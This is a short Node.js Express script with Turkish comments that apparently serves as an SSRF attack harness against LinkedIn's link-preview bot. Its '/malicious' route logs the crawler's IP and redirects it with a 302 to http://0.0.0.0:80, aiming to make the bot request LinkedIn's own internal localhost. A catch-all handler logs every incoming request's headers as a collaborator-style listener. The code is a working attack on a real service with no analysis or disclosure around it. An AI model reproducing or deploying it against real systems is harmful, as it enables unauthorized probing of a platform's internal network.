const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 1. Önce yönlendirme yapacağımız özel rotayı (endpoint) ekliyoruz
app.get('/malicious', (req, res) => {
    console.log("[+] LinkedInBot yönlendirme rotasına geldi! IP:", req.headers['x-forwarded-for'] || req.socket.remoteAddress);
    
    // Botu LinkedIn'in kendi içindeki localhost'a 302 ile paslıyoruz
    return res.redirect(302, 'http://0.0.0.0:80');
});

// 2. Diğer tüm genel istekleri loglayan mevcut middleware'in
app.use((req, res) => {
    const method = req.method;
    const url = req.url;
    const header = req.headers;

    console.log(method, url, header);
    return res.status(200).send("OK");
});

app.listen(3000, () => console.log("Collaborator 3000 portunda hazır!"));
